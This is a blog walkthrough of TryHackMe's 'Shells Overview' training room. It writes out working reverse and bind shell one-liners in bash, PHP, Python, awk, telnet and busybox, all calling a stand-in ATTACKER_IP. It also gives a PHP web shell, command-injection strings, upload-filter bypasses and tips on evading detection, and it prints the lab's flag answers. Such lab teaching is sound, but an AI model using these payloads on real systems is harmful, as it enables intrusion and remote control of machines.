---
title: "Shells Overview — TryHackMe Cyber Security 101"
date: 2026-05-11
category: "writeup"
excerpt: "Walkthrough of TryHackMe's Shells Overview room — Learn about the different types of shells."
image: "/images/blog/119.png"
readtime: "54 min read"
draft: false
---

## Tasks

- [Task 1 — Room Introduction](#task-1)
- [Task 2 — Shell Overview](#task-2)
- [Task 3 — Reverse Shell](#task-3)
- [Task 4 — Bind Shell](#task-4)
- [Task 5 — Shell Listeners](#task-5)
- [Task 6 — Shell Payloads](#task-6)
- [Task 7 — Web Shell](#task-7)
- [Task 8 — Practical Task](#task-8)
- [Task 9 — Conclusion](#task-9)

---

## Task 1 — Room Introduction {#task-1}

Shells. The goal of most attacks. You can have all the recon and scanning and enumeration in the world but eventually you want a shell on the target, because that's when you can actually do stuff. This room covers the three main flavors: reverse shells, bind shells, and web shells.

Important note from the room itself, no Metasploit here. We're doing this with raw commands, no framework holding our hand. Which honestly is the right way to learn it because if you only ever use Metasploit you don't really understand what's happening, you just understand how to type `exploit` and hope.

Everything in this room is Linux. Same concepts apply to Windows but the actual payloads and tools differ.

---

## Task 2 — Shell Overview {#task-2}

Quick definition first. A shell is just software that lets you talk to an OS. Could be graphical, but in security we almost always mean a command line one. When someone in pentesting/security says "I got a shell" they mean they've got a command prompt running on the target machine, typing commands and getting output back.

Why are shells so important:

**Remote system control.** The obvious one. You can run commands on the box from anywhere.

**Privilege escalation.** Most shells you get initially are low priv (some random www-data user from a web exploit, or a regular user account). Once you have the shell, you can start looking for ways to become root.

**Data exfiltration.** Once you can run commands you can read files, copy them out, grep through stuff. This is usually the actual goal of an attack.

**Persistence.** Add an SSH key, drop a backdoor, create a hidden user. Make sure even if they kick you out you can come back in.

**Post-exploitation.** Generic catch-all for everything you do after you have access. Dropping malware, deleting logs, all the cleanup and additional damage stuff.

**Pivoting.** This is the big one for engagements. The first box you compromise is rarely the actual target, it's usually just a foothold. From there you use the shell to see what other systems are reachable on the internal network and you hop to those. The shell is a launchpad.

**What is the command-line interface that allows users to interact with an operating system?** `Shell`

**What process involves using a compromised system as a launching pad to attack other machines in the network?** `Pivoting`

**What is a common activity attackers perform after obtaining shell access to escalate their privileges?** `Privilege Escalation`

---

## Task 3 — Reverse Shell {#task-3}

The reverse shell. This is the workhorse, the most common shell technique you'll see. The reason it's called "reverse" is the connection direction. Normally if you wanted to log into a server you'd connect TO the server. With a reverse shell, the SERVER connects out to YOU. Sometimes called a "connect back shell" which is a more descriptive name.

Why reverse shell? Firewalls. Most firewalls are set up to block incoming connections from the internet to internal machines (because that's how attackers get in), but they're way more permissive about outgoing connections from internal machines to the internet (because internal users need to browse the web, download stuff, talk to APIs, etc). So if you can make the target initiate the connection outwards, the firewall is much more likely to let it through. Reverse shells abuse exactly that asymmetry.

### How it works

Two pieces. The attacker sets up a listener on their machine waiting for incoming connections. Then somehow they get the target to run a payload that connects out to the listener. When the connection lands, the listener gets a shell on the target.

### Setting up the listener

Netcat is the classic tool. On the attacker box:

```bash
nc -lvnp 443
```

Breaking that down:

`-l` listen mode, sit and wait for a connection.

`-v` verbose, tells you what's happening.

`-n` no DNS resolution. Faster, less noise.

`-p 443` listen on port 443.

About the port choice. You can use any port you want technically. But people pick 443 (HTTPS), 80 (HTTP), 53 (DNS), 8080, 8443, etc. Why? Because on a corporate network with egress filtering, those ports are usually the ones that ARE allowed out. Nobody's letting random port 31337 out through their firewall, but port 443 is probably fine because every browser uses it. Blending in with normal traffic is the whole game.

### Triggering the payload

Now you need the target to actually run something that calls back. This is where the rest of pentesting comes in. Maybe you found a command injection vuln. Maybe you got code execution through a deserialization bug. Maybe you got someone to click a malicious file. However you got code execution, you use it to fire off your reverse shell payload.

The room shows a "named pipe" reverse shell as an example:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

This thing is a classic and looks intimidating until you break it down piece by piece:

`rm -f /tmp/f` clean up any leftover named pipe file from before.

`mkfifo /tmp/f` create a new named pipe (a special kind of file that lets two processes talk to each other).

`cat /tmp/f` read from the pipe and dump output.

`| sh -i 2>&1` pipe that into an interactive shell, and merge stderr into stdout so error messages come back too.

`| nc ATTACKER_IP ATTACKER_PORT` send the shell's output to netcat, which sends it over the network to the attacker.

`>/tmp/f` whatever netcat receives gets dumped back into the pipe, which gets read by `cat`, which gets fed to the shell. So you end up with a loop where: attacker types command → it goes through netcat → into the pipe → into the shell → output goes back through netcat → back to attacker.

Basically it's plumbing. The named pipe is the trick that lets the shell read from one place and write to another so the conversation is bidirectional. There are simpler ways to do this (like the bash one liner we'll see in task 6, which is way shorter) but this one works in restricted environments where some of the simpler techniques don't.

### Catching the shell

After the payload fires, your listener that was sitting there:

```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

target@tryhackme:~$
```

Boom. You have a shell. The prompt changes from `attacker@kali` to `target@tryhackme` because you're now sending commands to the target's shell. Type `whoami`, `id`, `hostname`, see what user you got, what box you landed on.

A heads up on this kind of shell. It's "dumb" by default. No tab completion, no arrow keys for history, if you accidentally hit Ctrl+C you kill the whole shell instead of canceling a command. There are tricks to upgrade these to a "fully interactive TTY" but that's a whole other rabbit hole. The Python pty trick is the most common one (`python -c 'import pty; pty.spawn("/bin/bash")'`).

**What type of shell allows an attacker to execute commands remotely after the target connects back?** `Reverse Shell`

**What tool is commonly used to set up a listener for a reverse shell?** `Netcat`

---

## Task 4 — Bind Shell {#task-4}

Bind shells. Less common, but worth knowing.

The flow is the opposite of a reverse shell. Instead of the target connecting OUT to the attacker, the target opens a port and SITS there listening, and the attacker connects IN to that port. The "binding" is the target binding a network port for the attacker to connect to.

### When to use it

Bind shells are useful when the target can't make outgoing connections (strict egress firewall, completely isolated network segment) but you can reach incoming ports on it. They're WAY less popular than reverse shells in real life because:

1. Firewalls usually block incoming connections, so this often doesn't work.
2. Having an extra port open on the target is suspicious. Defenders see a weird process listening on a port and they investigate.
3. The shell sits there waiting forever. If you don't connect fast enough, someone might find it.

So most of the time, reverse > bind. But you should still know about them.

### Setting it up on the target

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Same named pipe trick, but instead of netcat connecting OUT to an attacker IP, it's `nc -l 0.0.0.0 8080`, listening on port 8080 on all interfaces. The shell is still hooked up to netcat through the pipe, so when someone connects, they get a shell.

One thing the room mentions and you should remember: ports below 1024 are "privileged" on Linux. You need root to bind a netcat listener to them. So if you're a low-priv user when you set up your bind shell, stick to port 1024 or higher (8080, 4444, 9999, etc).

### Connecting from the attacker side

```bash
nc -nv TARGET_IP 8080
```

`-n` skip DNS, `-v` verbose, then the target IP and port. Simple.

```bash
attacker@kali:~$ nc -nv 10.10.13.37 8080 
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$
```

Connection lands and you have your shell. Same as a reverse shell from here, just the connection direction was flipped to set it up.

**What type of shell opens a specific port on the target for incoming connections from the attacker?** `Bind Shell`

**Listening below which port number requires root access or privileged permissions?** `1024`

---

## Task 5 — Shell Listeners {#task-5}

So far we've used Netcat as the listener. Netcat works fine, but there are alternatives that fix some of its annoyances.

### Rlwrap

Remember how I mentioned that catching a shell with plain netcat gives you a "dumb" shell with no arrow keys, no history, no tab completion? Rlwrap is a quick fix for that. It wraps any command and adds readline support to it.

```bash
rlwrap nc -lvnp 443
```

Now your reverse shell has arrow keys and command history that work. Doesn't fix tab completion or Ctrl+C, but it's a nice quality of life thing.

### Ncat

Ncat is netcat's improved cousin, ships with Nmap. It does everything netcat does plus a bunch more. The big one is SSL.

Plain ncat:

```bash
ncat -lvnp 4444
```

Same flags as netcat, basically a drop-in replacement.

With SSL:

```bash
ncat --ssl -lvnp 4444
```

Why SSL? Because plain netcat traffic is unencrypted, meaning anything that goes through your reverse shell (commands, output, files you exfil) is in the clear. Any monitoring tool sitting between you and the target sees everything. SSL wraps it in encryption so the traffic looks like a normal HTTPS connection. Massive deal for OPSEC.

Ncat generates a temporary self signed cert if you don't give it one:

```bash
attacker@kali:~$ ncat --ssl -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

Of course your payload on the target side also needs to know how to do SSL, otherwise the handshake fails. There are SSL-aware payloads, or you can just use `ncat --ssl` on the target side too (if it's installed there).

### Socat

Socat is the pro tool. Way more flexible than netcat or ncat, can do basically any kind of socket relay you can think of. The price is the syntax is way uglier:

```bash
socat -d -d TCP-LISTEN:443 STDOUT
```

`-d -d` is verbose verbose (more d's = more verbose, it's not a typo).

`TCP-LISTEN:443` listen on TCP port 443.

`STDOUT` send any received data to your terminal output.

That's a basic listener but socat shines when you need to do complex things like creating fully interactive TTY shells, port forwarding through chains of hosts, or terminating SSL on one side and forwarding plaintext on the other. If you stick with this stuff long enough you'll learn socat eventually whether you want to or not.

**Which flexible networking tool allows you to create a socket connection between two data sources?** `socat`

**Which command-line utility provides readline-style editing and command history for programs that lack it, enhancing the interaction with a shell listener?** `rlwrap`

**What is the improved version of Netcat distributed with the Nmap project that offers additional features like SSL support for listening to encrypted shells?** `ncat`

---

## Task 6 — Shell Payloads {#task-6}

Listeners are one half. Payloads are the other half. The payload is the command/script that runs on the target and either calls back (reverse shell) or starts listening (bind shell). The room dumps a bunch of these and they all do basically the same thing different ways.

Why so many variations? Because not every system has every tool installed. If you got code execution on a stripped down container that doesn't have netcat, you need a fallback. If bash is restricted, you reach for python. If python isn't there, maybe perl. Knowing several options is what makes you flexible.

The big cheat sheet to bookmark for these is PayloadsAllTheThings on GitHub, or the classic pentestmonkey reverse shell cheatsheet. Have those open while pentesting, you'll always be reaching for them.

### Bash

The simplest one:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

Bash has this magic feature where `/dev/tcp/HOST/PORT` doesn't actually exist as a file but bash treats it as a TCP connection. The `>&` redirects both stdout and stderr to that connection, and `0>&1` redirects stdin from the same place. So the shell's input and output are all tied to a TCP socket pointing at your listener. That's it. Stupid simple, works on most modern Linux systems.

The room shows a few more bash variations:

The "read line" version reads commands from a TCP socket and executes them in a loop:

```bash
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```

The file descriptor 196 version uses a different fd to keep things separate:

```bash
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```

The fd 5 version, similar idea:

```bash
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

Honestly 95% of the time the first plain `bash -i >&` one works and you never need the others. The variations exist for systems where the default version gets blocked or filtered. Sometimes a WAF or detection rule looks for the exact `bash -i >& /dev/tcp` string and you need a different syntax to slip past.

### PHP

PHP shows up everywhere in web exploitation because so many web apps run on PHP. If you can get PHP code execution on a server (LFI, RCE in some plugin, file upload to a PHP server) these are your friends:

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```

The `-r` flag runs PHP code from the command line. `fsockopen` opens a socket. Then `exec` runs `sh` with stdin/stdout/stderr all tied to file descriptor 3 (which is the socket).

Same exact idea with different functions:

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```

`exec`, `shell_exec`, `system`, `passthru`, `popen` are all PHP functions that execute system commands, just with slightly different return behaviors. Why have all five? Because servers sometimes disable specific dangerous functions in `php.ini` (the `disable_functions` directive). If `system` is disabled, try `passthru`. If that's disabled, try `popen`. The hardened the server, the more variations you'll need to try.

### Python

Python is on basically every Linux box by default. These are extremely portable:

Environment variable version:

```bash
export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

This sets the host and port as env vars, then the python connects, dups the socket onto stdin/stdout/stderr, and spawns bash through `pty.spawn` which gives you a much nicer interactive shell than the bash one liner.

Subprocess module version:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

Same end result, different way to get there.

Short version:

```bash
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

The python `pty.spawn("bash")` is actually huge because it gives you a proper TTY immediately. With a bash reverse shell you'd need to manually upgrade the TTY after catching it. With these python ones you basically get the upgraded TTY for free. Worth using over bash if python is available.

Heads up. You'll often see `python` not work because the system only has `python3`. Just swap `python -c` for `python3 -c` and you're good. Some old systems are the opposite, only have `python` (which is python 2). If neither work, try `python2`. Welcome to the python ecosystem.

### Others

Telnet because some old systems still have it and might not have netcat:

```bash
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```

Same named pipe trick from earlier, just with telnet instead of nc.

AWK reverse shell because if you're really stuck and somehow only awk is available:

```bash
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

Yes that's a reverse shell in awk. AWK has built in TCP support which is wild and completely overkill for what awk is supposed to do. I have never used this one in real life but it exists and it's beautifully cursed.

BusyBox, common on embedded systems and small containers:

```bash
busybox nc ATTACKER_IP 443 -e sh
```

The `-e` flag tells netcat "execute this binary and pipe its I/O to the network connection". Real netcat had `-e` but most modern distros ship a netcat without `-e` because it's considered too dangerous. BusyBox often still has it. Useful to remember on routers, IoT stuff, and stripped down containers.

**Which Python module is commonly used for managing shell commands and establishing reverse shell connections in security assessments?** `subprocess`

**What shell payload method in a common scripting language uses the `exec`, `shell_exec`, `system`, `passthru`, and `popen` functions to execute commands remotely through a TCP connection?** `PHP`

**Which scripting language can use a reverse shell by exporting environment variables and creating a socket connection?** `Python`

---

## Task 7 — Web Shell {#task-7}

Different beast entirely. A web shell isn't a network shell, it's a script that lives on a web server and lets you run commands by visiting a URL.

The basic idea: you find a way to get your file onto a web server (file upload vuln, LFI to RCE, or you already have shell access from somewhere else), and that file is written in a language the server runs (PHP, ASP, JSP, Python with CGI). Then anyone who hits that URL is running commands on the server.

### Tiny PHP web shell

The classic example is comically small:

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Save that as `shell.php`. Upload it to a server that runs PHP. Now you visit it like:

```
http://victim.com/uploads/shell.php?cmd=whoami
```

And the server runs `whoami` and prints the result on the page. That's the whole web shell. Six lines of code and you've got command execution as whatever user the web server runs as (typically www-data on Linux, IIS APPPOOL on Windows, etc).

This is unbelievably small but it's also exactly how a lot of real attacks work. There are massive enterprise breaches that started with someone uploading a PHP file like this and then using it to dig deeper.

### How they get there

To deploy a web shell you typically need one of:

**Unrestricted File Upload.** The app lets you upload files but doesn't check the file type, so you can upload a .php instead of a .jpg. Then you visit the upload URL.

**Local File Inclusion (LFI).** The app loads files based on user input without sanitizing it. Sometimes you can chain LFI with log poisoning or session manipulation to get code execution.

**Command Injection.** The app passes user input directly to a shell. You can use this to write your shell file via something like `; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php; #`.

**Existing access.** You already broke in some other way and you're using a web shell as a persistence mechanism so you can get back in later through a "normal looking" URL.

### Real world web shells

The minimal one above is great as a teaching example but pretty rough to use. People made full featured web shells with file managers, terminal emulators, database access, the works:

- **p0wny-shell** is a single-file PHP shell with a nicer terminal style interface.
- **b374k** is a more feature heavy PHP shell, file manager built in, lots of bells and whistles.
- **c99** is the OG, been around forever, kitchen sink approach, kind of bloated and easily detected by AV nowadays but still works on unpatched servers.

These are all hosted on GitHub or shell collection sites. They're designed to look unassuming if someone glances at the file list but as soon as you load them in a browser you get a full attacker toolkit.

Defenders hate web shells because they hide really well. A 600 byte PHP file in an uploads folder among 10,000 image files is invisible unless you specifically look for it. There are tools (like Wordfence, ClamAV with PHP signatures, custom IDS rules) but it's an arms race and the attackers usually win on day one.

**What vulnerability type allows attackers to upload a malicious script by failing to restrict file types?** `Unrestricted File Upload`

**What is a malicious script uploaded to a vulnerable web application to gain unauthorized access?** `Web Shell`

---

## Task 8 — Practical Task {#task-8}

Time to use this stuff. The challenge has three services on the box:

- Port 8080: just a landing page, nothing important.
- Port 8081: a web app with a command injection vulnerability.
- Port 8082: a web app with an unrestricted file upload vulnerability.

Two flags to grab, both sitting in `/` on the file system.

### Flag 1: Command injection → reverse shell

The general approach for this one:

Hit `MACHINE_IP:8081` in the browser and look at what the app does. Command injection vulns usually live in places where the app takes some kind of user input and passes it to the system (think ping forms, lookup tools, anything that might be calling out to a shell command). You'll see something like an input field for an IP, hostname, or URL.

Test for the vuln by injecting a command separator after some normal looking input. Common ones to try:

```
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 whoami
127.0.0.1 $(whoami)
```

If any of those return the output of `whoami` along with the normal response, you've got command injection.

Once that works, set up your listener on the AttackBox:

```bash
nc -lvnp 4444
```

Then send a reverse shell payload via the injection. The bash one is the easiest:

```
127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

If that gets eaten by the URL parser (special characters can be a pain in URL parameters), try URL encoding it, or use the python one. Sometimes you have to base64 encode the payload and decode it server-side to get past character filtering:

```
127.0.0.1; echo BASE64STRING | base64 -d | bash
```

Once the shell lands on your listener, `cat /flag.txt` or whatever's in `/` and you're done with flag 1.

### Flag 2: File upload → web shell

Hit `MACHINE_IP:8082`. Find the upload form. The vuln is that it accepts whatever file you give it without checking the type properly.

Save the tiny PHP shell from Task 7 as something like `shell.php`:

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Upload it. Find where uploaded files end up (could be `/uploads/`, `/files/`, `/images/`, common paths, or the response after upload tells you). Visit:

```
http://MACHINE_IP:8082/uploads/shell.php?cmd=ls /
```

If you see a directory listing of `/`, your shell works. Then:

```
http://MACHINE_IP:8082/uploads/shell.php?cmd=cat /flag.txt
```

(Or whatever the flag file is actually called. `cmd=ls /` first to see what's there.)

Two common gotchas to watch out for. First, sometimes the upload form has SOME validation, like checking the extension or the Content-Type header. If a `.php` upload gets rejected, try variants like `.phtml`, `.php5`, `.php7`, `.phar`, or fiddle with the Content-Type header in Burp. Second, the spaces in URL parameters need to be `%20` or `+`. So `cmd=cat /flag.txt` becomes `cmd=cat%20/flag.txt`.

**Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?** `THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}`

**Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the / directory?** `THM{202bb14ed12120b31300cfbbbdd35998786b44e5}`

---

## Task 9 — Conclusion {#task-9}

Three shells, three different jobs.

**Reverse shells** call back from target to attacker. The default for most attacks because firewalls usually let outbound traffic through.

**Bind shells** open a port on the target and wait. Useful when outbound is blocked but inbound works, which is rarer.

**Web shells** live on a compromised web server and give command execution through HTTP. Stealthy, hard to find in among other files, often used for persistence.

A few things from doing this stuff that are worth remembering. One, always have multiple payload options ready. The first thing you try will fail half the time because of disabled functions, missing tools, or filtering. Have bash, python, php, and netcat versions of each thing in a notes file. Two, ncat with SSL is a way better default listener than plain netcat for anything beyond CTFs. Plain netcat sends everything in the clear and any defender with traffic monitoring sees you immediately. Three, if you catch a reverse shell that feels broken (Ctrl+C kills it, no tab completion, weird behavior), upgrade it. Makes the shell behave like a real terminal.

Shells are the foundation of post-exploitation. Get really comfortable with them because once you start doing real assessments you'll be living in shells more than any other tool.

---